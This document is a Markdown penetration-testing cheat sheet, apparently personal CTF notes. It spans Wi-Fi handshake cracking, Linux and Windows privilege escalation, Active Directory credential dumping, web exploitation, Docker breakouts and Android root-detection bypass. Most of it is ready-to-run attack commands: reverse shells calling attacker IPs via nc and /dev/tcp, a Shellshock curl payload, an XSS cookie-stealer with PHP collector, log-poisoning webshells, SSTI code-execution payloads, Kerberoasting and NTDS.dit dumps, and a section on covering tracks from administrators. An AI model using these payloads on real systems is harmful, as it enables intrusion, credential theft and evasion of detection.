# Wireless

To start with WPA2 Cracking make sure that your network interface is in monitor <br/>

````
ifconfig wlan0 down
iwfconfig wlan0 mode managed
ifconfig wlan0 up
````
Then run airmon-ng <br/>
```
airmon-ng check kill
airmon-ng start wlan0
```
To sniff different AP (Access Points)<br/>

`airodump-ng wlan0`

To start capturing traffic for a specific AP we use channel number `-c` and MAC address `--bssid` <br/>

`airodump-ng -c CHANNEL_NUMBER --bssid MAC_ADDRESS wlan0 `<br/>

Now in order to capture the 4-way handshake we need to start the above command with a parameter `-w` so that the caputre file can be saved<br/>

 `airodump-ng -c CHANNEL_NUMBER --bssid MAC_ADDRESS -w FILENAME wlan0`<br/>

Keep this running and launch the deauthentication attack on the AP with a specific host , you can do this to death all clients/host on the AP <br/>

`aireplay-ng -0 0 -a MAC_ADDRESS -c HOST_NAME wlan0`<br/>

When a client connects back to the host this will capture the handshake.To crack the password we need to use aircrack-ng <br/>

`aircrack-ng FILENAME.cap -w path/towordlist/`

When the passwords get cracked you can then go back to using `managed mode on your` network interface<br/>

`sudo systemctl restart NetworkManager.service` 

# Linux

### Stablilize Shell
1. ctrl+z
2. stty raw -echo
3. fg (press enter x2)
4. export TERM=xterm , for using `clear` command

### Ping for devices on LAN

1. `netdiscover -i <interface>`
2. `arp-scan -l`
3. `fping -a -g <ip>/24`
4. `nmap -n -sP <ip>/24`
5. `for i in $(seq 1 254); do ping -c1 -t 1 192.168.168.$i; done`

### Spawn bash
* /usr/bin/script -qc /bin/bash 1&>/dev/null
* python -c 'import pty;pty.spawn("/bin/bash")'
* python3 -c 'import pty;pty.spawn("/bin/bash")'

### Vulnerable sudo (ALL,!root)
`sudo -u#-1 whoami`<br />
`sudo -u#-1 <path_of_executable_as_other_user>`

### Execute as diffent user
`sudo -u <user> <command>`

### FTP
Connect to ftp on the machine<br/>
`ftp user <ip>`
After successfully logged in you can download all files with
`mget *`
Download files recusively<br/>
` wget -r ftp://user:pass@<ip>/  `


### SMB Shares

#### SmbClient
* `smbclient -L \\\\<ip\\`     listing all shares
* `smbclient \\\\<ip>\\<share>` accessing a share anonymously
* `smbclient \\\\10.10.209.122\\<share> -U <share> `accessing a share with an authorized user

#### Smbmap
* `smbmap -u <username> -p <password> -H <ip>`

#### Smbget

* `smbget -R smb://<ip>/<share>` 

### NFS shares
* `showmount -e <ip> ` This lists the nfs shares
* `mount -t nfs <ip>:/<share_name> <directory_where_to_mount>` Mounting that share

### Cronjobs

* cronjobs for specific users are stored in `/var/spool/cron/cronjobs/`
* `crontab -u <user> -e ` Check cronjobs for a specific user
* `crontab -l`         cronjob for the current user
* `cat /etc/crontab`  system wide cronjobs

### Finding Binaries

* find . - perm /4000 (user id uid) 
* find . -perm /2000 (group id guid)

### Finding File capabilites

`getcap -r / 2>/dev/null`

### Finding text in a files
`grep -rnw '/path/to/somewhere/' -e 'pattern'
`
### Changing file attributes

chattr + i filename `making file immutable`<br/>
chattr -i filename `making file mutable`<br/>
lschattr filename `Checking file attributes`

### Uploading Files

scp file/you/want `user@ip`:/path/to/store <br/>
python -m SimpleHTTPServer [port] `By default will listen on 8000`<br/>
python3 -m http.server [port] `By default will listen on 8000`<br/>

### Downloading Files

`wget http://<ip>:port/<file>`

### Download files only with bash script

```
#!/bin/bash
download() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT

  # send request
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3

  # read the header, it ends in a empty line (just CRLF)
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3

  # read the data
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

```

### Netcat to download files from target

`nc -l -p [port] > file` Receive file <br/>
`nc -w 3 [ip] [port] < file `Send file <br/>

### Cracaking Zip Archive

`fcrackzip -u -D -p <path_to_wordlist> <archive.zip>`

### Decrypting PGP key
If you have `asc` key which can be used for PGP authentication then 
* john key.asc > asc_hash
* john asc_hash --wordlists=path_to_wordlist

#### Having pgp cli
* pgp --import key.asc
* pgp --decrypt file.pgp

#### Having gpg cli
* gpg --import key.asc
* gpg --decrypt file.pgp

### killing a running job in same shell
`jobs`

```
Find it's job number

$ jobs
[1]+  Running                 sleep 100 &

$ kill %1
[1]+  Terminated              sleep 100

```
### SSH Port Forwarding
`ssh -L <map_blocked_port>:localhost:<port_that_is_blockd_> <username>@<ip>`

## SSH Dynamic Port Forwarding

`ssh username@ip -i id_rsa(optional) -D 1337`

### SSH auth log poisoning

Login as any user to see that it gets logged then try to login with a malicious php code

### Port Forwarding using chisel

On attacker machine `/chisel_1.7.6_linux_amd64 server -p <port to listen>  --reverse`
On target machine `./chisel client <attacker>:<attacker_listening_port> R:localhost:<port to forward from target>`

### Poisining ssh auth log

`ssh '<?php system($_GET['a']); ?>'@192.168.43.2` 

Then `http://ip/page?a=whoami;`

## SMTP

Using `VRFY` we can check which email addresses are valid or we can try to send an email and verify through `RCPT TO:email`<br/>


Sending an email address with attachment we can use `sawks` 

```bash
swaks --server IP -f from@arz.com -t to@arz.com --attach file.rtf

```

https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum

### Screen

If there's a  deattached screen session running as root , we can re attach it only if screen binary has SUID bit `screen -r root/`

### Getting root with ln (symlink)

If we have permissions to run /usr/bin/ln as root we can onw the machine
```
echo 'bash' > root
chmod +x root 
sudo /usr/bin/ln -sf /tmp/root /usr/bin/ln
sudo /usr/bin/ln

```
### Escaping restricted Shell (rbash)

#### Using vi editor

```
: set shell =/bin/sh
: shell
```
Then setting the PATH variable

`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

#### Using -t 'bash --noprofile'

When logging in with ssh we can using -t to enable pseudo-tty allocation and then we can change the PATH and SHELL varaible

### Tar Exploitation

When ever you see a cronjob running with a command `cd /<user>/andre/backup tar -zcf /<folder>/filetar.gz *` go to that folder from which a backup is being created and running these command in that directory <br/ >
```
echo "mkfifo /tmp/lhennp; nc 10.2.54.209 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

### Binary Exploits

If there is a certain command running in a binary example `date` so we can create our own binary and add `/bin/bash` to and path so it gets executed<br/>
`export PATH=<path_where_binary_is>/:$PATH`

### Shared Library (LD_PRELOAD)

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

### MairaDB Command Execution

https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html

### VNC

If there's a port 5901 or 5900 open it's likely that it's for VNC , if you see `.remote_secret` or `.secret` it's the password for connecting for vnc

`vncviewer -passwd remote_secret <ip>::<port>`

#### Decrpyting vnc password

We can also decrypt the password for vnc using  `https://github.com/jeroennijhof/vncpwd`

`./vncpwd remote_secret  `

### Enumration 

* cat /etc/*release 
* cat /etc/issue 
* uname -a
* lsb_release -a
* Running Linpeas
* ss -tulpn (for ports that are open on the machine)
* netstat -tulpn
* ps -ef --forest

# Windows

### Adding User
net user "USER_NAME" "PASS" /add
### Changing User's password
net user "USER_NAME" "NEWPASS"
### Adding User to Administrators
net localgroup administrators "USER_NAME" /add
### Changing File Permissions
CACLS files /e /p {USERNAME}:{PERMISSION}<br/>
Permissions:<br/>
1.R `Read`<br/>
2.W `Write`<br/>
3.C `Change`<br/>
4.F `Full Control`

### Set File bits
attrib +r filename `add read only bit`<br/>
attrib -r filename `remove read only bit`<br/>
attrib +h filename `add hidden bit `<br/>
attrib -h filename `remove hidden bit`

### Show hidden file/folder
dir /a `show all hidden files & folder`<br/>
dir /a:d `show only hidden folder`<br/>
dir /a:h `show only hidden files`<br/>

### Downloading Files
`certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
`powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`<br />
`powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`

## Enumeration

* Running `winPEAS.exe` on the machine 
* Running `PowerUp.ps1` (https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) , documentation https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ `. .\PowerUp.ps1` Then `Invoke-AllChecks`

## AlwaysInstallElevated 

If you see that `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` returns 1 it means that we can install any windows program as SYSTEM
So to exploit this generate a windows payload <br/>

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi`<br/>
Start a netcat listener <br/>

Transfer and run this on target machine <br/>
`msiexec /quiet /qn /i shell.msi`<br/>

Alternatively this can be done with metaslpoit's post exploitation module

`exploit/windows/local/always_install/elevated`

## List Drives
`wmic logicaldisk get caption`

## Decrypting PSCredential Object
* $file = Import-Clixml -Path <path_to_file>
* $file.GetNetworkCredential().username
* $file.GetNetworkCredential().password

### Evil-winrm
`evil-winrm -i IP -u <USER> -p <PASS>`

To use evil-winrm on port 5986 (with a certificate)

`evil-winrm --i IP -u <USER> -p <PASS> -S -c file.crt -k file.key`

### Psexec.py
` python psexec.py DOMAIN/USER:PASS@IP`

### Forced Authentication (Stealing NTLMv2) 

https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication

### Crackmapexec

#### Bruteforce Usernames using RID (Objects in AD)

`crackmapexec <IP> -u 'Anonymous' -p ' ' --rid-brute`

### Privlege Escalation using SeImpersonatePrivilege

If this is enabled we can upload `Printspoofer.exe ` and place it if we have rights  

`PrintSpoofer.exe -i -c powershell.exe`

### Becoming NT\AUTHORITY (If user is in local administrators group)

If the system has `PsExec.exe` open elevated cmd 

`.\PsExec.exe -i -s cmd.exe`

### Forced authentication (Stealing Hahses)

If we have access to upload files , we can upload SCF (Shell Command File) in which we can specify our IP and share so that when it makes a request to it , it's going to authenticate to our share with credentials

```
[Shell]
Command=2
IconFile=\\IP\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Then launch responder to capture the NTLMv2 hash

`responder -i tun0`

## Active Directory

`powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
`. .\PowerView.ps1`      import the PowerView module

### Query Users through LDAP

`windapsearch -d 'domain.local' --dc IP -m users`

## Gaining Infromation about AD Bloodhound

### Using BloodHound Injester 

```
python3 bloodhound.py -d 'DOMAIN_NAME' -u 'VALID_USERNAME' -p 'VALID_PASSWORD' -gc 'HOSTNAME.DOMAIN' -c all -ns IP
```
Import the json files in bloodhound GUI <br/>

### Using Shraphound 

* Upload `Sharphound.ps1` (https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
* Then `. .\Sharhound.ps1`
* `Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN-NAME -ZipFileName loot.zip` Domain name can be found by running `Get-ADDomain` and look for result
<img src="https://imgur.com/NxWapei.png"/>
* This command will give an archive which you will have to simply drag and drop on the bloodhound GUI running on your local machine and then quries for kerberoastable accounts or getting more information

## Kerberoasting Attack 

### Using Impacket GETNPUsers.py

If we see any kerberoastable service account through bloodhound we can get that account's hash through this impacket script <br/>
```
python3 GetNPUsers.py DOMAIN/USERNAME:PASSWORD -dc-ip IP -request
```

### Using Rubeus

* Download rubeus `https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe`
* Documentation `https://github.com/GhostPack/Rubeus`
* Transfer rubeus.exe on targeted windows machine and run `.\Rubeus.exe kerberoast /outfile:C:\temp\hash.txt` to get a hash

## Dumping NTDS.dit

If we find a user having DCsync rights or GetChangeAll privileges meaning to replicate AD secrets (NTDS.dit) we can dump NTDS.dit <br/>

```
python3 secretsdump.py 'DOMAIN/USERNAME':'PASSOWRD'@IP -just-dc-ntlm
```

## Dumping LAPS

LAPS is a Local Adminstrator Password Solution which will ensure that the password for administrator account is set random across the AD environment, to dump LAPS we can do it in three ways 

### Dumping through crackmapexec

```bash
cme ldap IP -u 'USER' -p 'PASS' -M laps
```

### Dumping through LAPS Dumper (https://github.com/n00py/LAPSDumper)

```bash
python3 ./laps.py -u 'USER' -p 'PASS' -d domain
```

### Dumping through Powershell's AD-Module

```powershell
Get-ADComputer -Identity "HOST_NAME" -Properties "ms-mcs-AdmPwd"
```

### Abusing Constrained/Unconstrained Delegations
```
https://cheatsheet.haax.fr/windows-systems/privilege-escalation/delegations/

https://github.com/dirkjanm/krbrelayx
```

# FreeBSD

### Enumeration

* The path for binaries is  `/usr/local/bin`

### Reverse Shell

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc <ip> <port> > /tmp/f`

# Msfvenom
### List All Payloads
msfvenom -l payloads
### List Payload Format
msfvenom --list formats

# Meterpreter
### Adding user for RDP
run getgui -u [USER_NAME] -p [PASS]

### Pivoting
`use post/multi/manage/autoroute`
Example you are on a host with IP 172.18.0.1
`set RHOSTS 172.18.0.0`
`set SESSION <session_number`

### Using socks4a proxy

`use auxiliary/server/socks_proxy`
`SET SOCKS 4a`
`exploit`

Edit the port if you want to by default the `SRVPORT` is set to 1080 , you can edit it on `/etc/proxychains.conf`

### Port scan

`use auxiliary/scanner/portscan/tcp`
`set RHOSTS <subnet>/24`

### Port Forwarding

` portfwd add -l <port_to_listen> -p <port_to_be_open> -r <targeted_ip`

### MSSQL Code Execution

Using `use admin/mssql/mssql_exec` we can execute code by specifying the credentials<br />
Using `sqsh -S IP -U <username> -P <password>` then `EXEC master ..xp_cmdshell 'whoami' `


# Git

### Dumping repository
`./gitdumper.sh <location_of_remote_or_local_repostiory_having./.git> <destination_folder>`

### Extracting information from repository
`./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>`

# Web

### Make sure to check for backup files

If you came across a php file , look for a `.bak` as well i.e `config.php.bak`

### 403 By pass

https://github.com/intrudir/403fuzzer <br />

`python3 403fuzzer.py -hc 403 -u http://<ip>/page_that_you_want_to_bypass(which is usally a 403 foribben)`

### Cgi-bin

If we find `cgi-bin` directory which exists on the web server it's good to fuzz for files in that directory and we find we can abuse this which is known as shell shock vulnerability to run bash commands on the web server through this application <br/>

#### Manually 

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1' http://Remote IP/cgi-bin/file
``` 

#### Using Metasploit

`use multi/http/apache_mod_cgi_bash_env_exec`

### Symfony / Frontend server rule bypass

If we have don't have access to an endpoint could be an admin panel , we can just request for a `/` and at that point in either `X-Original-URL` or ` X-Rewrite-Url`

https://githubmemory.com/repo/sting8k/BurpSuite_403Bypasser/issues/4

### XSS to RCE
```
Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
```
### LFI/RFI

Try to read local files like log files ,apache virtual host configuration file source code on the target machine<br/>

Virutal Hosts file : `/etc/apache2/sites-available/000-default.conf`<br/>

If we can read log files,we can poison them to get RCE<br />

#### For Apache2

For apache `/var/log/apache2/access.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>`in User-agent<br/>

#### For Niginx

For niginx `/var/log/nginx/error.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>` in User-agent or try to add it in a file having a paramter make sure it's not being url encoded <br/>

Also to check `/etc/nginx/sites-available/default`

#### Proc

To see list of processes running on the system we can read this file `/proc/sched_debug`

### XXE - XIncludes Attack

We can use XInclude when SOAP is being used in an application and we can't introduce DTD , so we'll have to replace a value of a paramter with <br/>
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
### XXE - Apache Batik Library 

https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/


### SSI (Server Side Includes)

` echo '<!--#exec cmd="nc -e /bin/bash IP PORT" -->' > backdoor.shtml`

### SSTI (Server Side Template Injection)

#### Jinja2
To check if it's jinja test`{{7*'7'}}` this would return 7777

Check for `{{4*4}}` on the url `http://IP/{{4*4}}` if it returns "16" as a result it is vulnerable to SSTI <br/>

`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`<br/>

**Exploit**<br/>
`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`

### SSTI WAF Bypass

- https://chowdera.com/2020/12/20201221231521371q.html
- https://www.fatalerrors.org/a/0dhx1Dk.html
- https://hackmd.io/@Chivato/HyWsJ31dI


### XSS Session Hijacking

Have this php file hosted on your machine<br />
```
<?php
        header ('Location:http://domain');

        if (isset($_GET["c"]))
        {
                $cookies = base64_decode(urldecode($_GET["c"]));
                $file = fopen('log.txt', 'a');
                fwrite($file, $cookies . "\n\n");
        }
?>

```
Run this script where you find web application is vulnerable to xss
`<script>document.location='http://<ip>/cookie.php?c='+encodeURIComponent(btoa(document.cookie));</script>`


Alternatively run this <br/ >

https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md<br/>



### SQL Map
`sqlmap -r request.txt --dbms=mysql --dump`

### Wfuzz

`wfuzz -c -z file,wordlist.txt --hh=0  http://<ip>/<path>/?date=FUZZ`

If we want to use two payloads in the same request 

`wfuzz -c -w path/to/firs/wordlist -w /path/to/second/wordlist -u http://ip/FUZZ/FUZ2Z` <br/>

This FUZ2Z will specify to use the second wordlist , we can do this upto FUZnZ (where n is number of the wordlist we specify)

### API (Applicaton Programmable Interface)

* Check for possibility if there is a v1 , it is likely to be vulnerable to LFI 
* Use wfuzz which is tool to fuzz for API end points or for parameter
`wfuzz -u http://<ip>:<port>/<api-endpoint>\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404` <br/>
Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_history` "?" is before the parameter and FUZZ is telling to find a parameter and we are looking for `.bash_hitory` as an example

### Web Shell Bash
`bash -c "<bash_rev_shell>"`

### Cacti

This is remote code execution exploit for cacti 1.2.8 <br/>

https://zerontek.blogspot.com/2020/10/hacking-walkthrough-cacti-128-ubuntu.html

### Wordpress
using wpscan we can find users or do some further enumeration of wordpress version
* `wpscan --url http://<ip>/wordpress -e u` Enumerate Users
* `wpscan --url http://<ip>/wordpress -e ap --plugins-detection aggressive` Enumearte All plugins

#### To bruteforce passwords
* `wpscan --url <ip> -U user_file_path -P password_file_path`

After logging into the wordpress dashboard , we can edit theme's 404.php page with a php revershell
`http://<ip>/wordpress/wp-content/themes/twentytwenty/404.php`

#### To list which plugins are being used

`nmap -p 80 --script http-wordpress-enum --script-args search-limit=3000 10.10.11.125 -vv `

#### To get a RCE

* Goto `Appearance` -> `Editor` Select the 404.php template of the current theme and paste php reverse-shell.
* Then navigate to `http://ip/wp-content/themes/twentyfifteen/404.php` (theme name can be twentytwenty for the latest one) 

#### Manual Enumeration

https://www.armourinfosec.com/wordpress-enumeration/

### Node JS

#### Prototype Pollution

##### PUG

```

{
    "key": "value",
    "__proto__.block": 
    {
        "type": "Text",
        "line": "test;return process.mainModule.constructor._load('fs').readdirSync('./', {encoding:'utf8', flag:'r'})",
        "val": "THIS IS THE VALUE"
    } 
}
```
### JTW

#### JKU

https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c

### Apache Tomcat

```
If we have access to /manager/html , we can upload a WAR payload (arz.war) and access it through http://ip/arz
```
#### Apache Tomcat used with nginx 

```
If we nginx is being used as a reverse proxy to apache tom we can abuse it through Path Traversal Trough Reverse Proxy Mapping
```
https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/

https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf


# Wordlists

### Directory Bruteforcing
* /usr/share/wordlists/dirb/big.txt
* /usr/share/wordlists/dirb/common.txt
* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Gobuster
* `gobuster dir -u http://<ip>/ -w <path_to_wordlist>`
* `gobuster dir -u http://<ip>/ -w <path_to_wordlist> -s "204,301,302,307,401,403"` (use status code if 200 is configured to respond on the web server to every get request)

### Feroxbuster
`feroxbuster -u http://<ip>/ -w <path_to_wordlist>`

### Dirsearch
`python3 dirsearch.py -u http://<ip>/ -w <path_to_text>`

### Credential Bruteforcing
* /usr/share/wordlists/rockyou.txt
* /usr/share/wordlists/fasstrackt.txt
* using `crackstation`
* using `seclists`

### Hydra 

When the login shows an error message<br/> 

`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form '/login.php:username=^USE
R^&password=^PASS^:F=Incorrect!' -t 64 -V -I`


When the login doesn't show an error message so we can specify a `success (s)` string which is shown after we login to a site , typically logout is shown to us.<br/>
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form '/login.php:username=^USE
R^&password=^PASS^:S=logout' -t 64 -V -I`

# Hash Cracking 

### Hashcat

* If you have a salted hash and you know the salt to crack it `hash:salt`
 
# Generating Worlists for directory brute force

### Cewl 
This spiders the given url and finding keyowrds then makes a wordlists through it's findings<br/>
`cewl.rb <ip>`

### Cruch

If we want to generate a password list having length of 7 starting with "milo" and having 3 digit number at the end we can use % for numbers , @ for lowercase letters, , for uppercase letters and ^ for special characters

` crunch 7 7 0123456789 -t milo%%% -o password.txt`

# DNS

### Finding Subdomain
`wfuzz -c -w <path_to_wordlist> -u 'http://domain.com -H "Host: FUZZ.domain.com" `

### Zone Transfer

If there is a port 53 open on the machine you could do a zone transfer to get information about DNS records

`dig axfr @<ip> <domain_name>

# King Of The Hill (KoTH)
### Monitoring and Closing Shell (Linux)
* strace `debugging / tamper with processes`
* gbd `c/c++ debugger`
* script - records terminal activites
* w /who `check current pts ,terminal device`
* ps -t ps/pts-number `process monitoring`
* script /dev/pts/pts-number `montior terminal`
* cat /dev/urandom > /dev/pts/pts-number  2>/dev/null `prints arbitary text on terminal`
* pkill -9 -t pts/pts-number
* Add this in root's crontab (crontab -e) <br />
```
*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
```
Or you can add in system wide contab (nano /etc/crontab)

```
*/1 * * * *     root    /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
```
### Change SSH port
`nano /etc/ssh/sshd_config` (change PORT 22 to any port you want also you can tinker with configuration file)
`service sshd restart`     (Restart SSH service to apply changes)
### Hide yourself from "w" or "who"
`ssh user@ip -T` This -T will have some limiations , that you cannot run bash and some other commands but is helpful.

### Run Bash script on king.txt
`while [ 1 ]; do /root/chattr -i king.txt; done &`

### Send messages to logged in users
* echo "msg" > /dev/pts/pts-number `send message to specific user`<br />
* wall msg `boradcast message to everyone`<br />
  
### Closing Session (Windows)
* quser
* logoff id|user_name  

# LDAP

```
ldapsearch -x -LLL -h localhost -D 'cn=USER,ou=users,dc=domain,dc=com' -w PASSWORD -b "dc=domain,dc
=com"
```

# Covering Track
11.11. Covering our Tracks

The final stages of penetration testing involve setting up persistence and covering our tracks. For today's material, we'll detail the later as this is not mentioned nearly enough.

During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.

On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. Some log files of interest:

    "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
<img src="https://imgur.com/37aTxnI.png"/>
          
    "/var/log/syslog" (System events such as firewall alerts:)
<img src="https://imgur.com/k7scyUP.png"/>    
    "/var/log/<service/"
    For example, the access logs of apache2
        /var/log/apache2/access.log
<img src="https://imgur.com/y8Rin3h.png"/>
          
# Docker
To see list of conatiner/images on a remote machine <br/>
`docker -H <ip>:2375 images`
To see list of currently running images/conatiner on a remote machine <br/>
`docker -H <ip>:2375 ps -a  `<br/>
To start a container from a remote machine <br/>
`docker -H <ip>:2375 exec -it <container-id> /bin/sh`<br/>
To start a container from a remote machine using name and tags<br/>
`docker -H <ip>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh`<br/>
Break out of docker container<br/>
`docker -H tcp://<ip>:2375 run --rm -it -v /:/host <container_name> chroot /host bash`<br/>
If docker.sock is on conatiner , upload static docker binary<br/>
`./docker -H unix:///var/run/docker.sock images`<br/>
`./docker -H unix:///var/run/docker.sock run -it -v /:/host/ wordpress chroot /host`<br/>

Remove docker images 
`docker rmi $(docker images -q)` <br/>

Remove docker containers

`docker stop $(docker ps -a)`<br/>

## Docker Breakout/Exploits

* If we have a privilege docker and we can run command `fdisk -l` and view storage on the machine then we can mount the host file system <br/>

`mount /dev/sda<x> /mnt/host`

* We can look for container capabilites on docker with `capsh --print` and exploit it SYS_MODULE

https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd

* There's another exploit realted to docker (CVE-2019-5736)

https://github.com/Frichetten/CVE-2019-5736-PoC

# Kubernetes

## Basic Commands

### To get information of all pods which 
          
`kubectl get pods` 

### To get infromation of namespaces which organize clusters         
          
 `kubectl get namespaces`

### Get information of pods from a sepecfic namespace

`kubectl get pods -n namespace`

### Get secrets 

`kubectl get secrets -n kube-system`

### Get information of secrets

`kubectl describe secret <secret_name> -n <namespace_name>`
          
### Get information of pod

`kubectl get -o json pod <pod_name> -n <namespace_name>`

## Creating Malicious Pods

https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf
          
https://github.com/BishopFox/badPods

# Android

## Using ADB

ADB (Android Debuggable Bridge) allows to conneect to android devices through command line and allows to execute shell commands

If there is only one device connected or using `Genymotion` then use
```
adb shell 
```

Or if there are multiple devices connected then first run `adb devices` to note the device ID and connect with `-s`

```
adb -s DEVICE_ID shell
```

To install apks through adb

```
adb install file.apk
```

To transfer data to device

```
adb push file /data/local/tmp
```

## Root Detection Bypass

Some applications won't run on rooted devices but it can be bypassed using either frida , objection , Xposed/EdXposed modules (unrootbeer , Rootcloak) or using Magisk 

### Using Frida

There are number of scripts available to bypass root detection , there's a universal script (https://codeshare.frida.re/@dzonerzy/fridantiroot/) that can bypass root detection but it's unstable , a better version is available here (https://gist.github.com/pich4ya/0b2a8592d3c8d5df9c34b8d185d2ea35)


First run frida server on the device then run frida through windows or linux

```
frida --codeshare dzonerzy/fridantiroot -f com.packagename -U
```

### Objection

Objection can also be used to bypass root detection if scripts fail , thus also works with frida 

```
objection --gadget com.android.packagename explore
```

To list activities in the application

```
android hooking list activities
```

To list methods with return type from an activity

```
android hooking list class_methods android_packagename.activity_name
```

## Logging 

Sometimes application might be logging the input so we can capture it through running `logcat`

## Data stored on storage

Data saved by android application can be accssed through `/data/data/package_name`


## SSL Pinning

## Intents

## Remote Code Execution
      
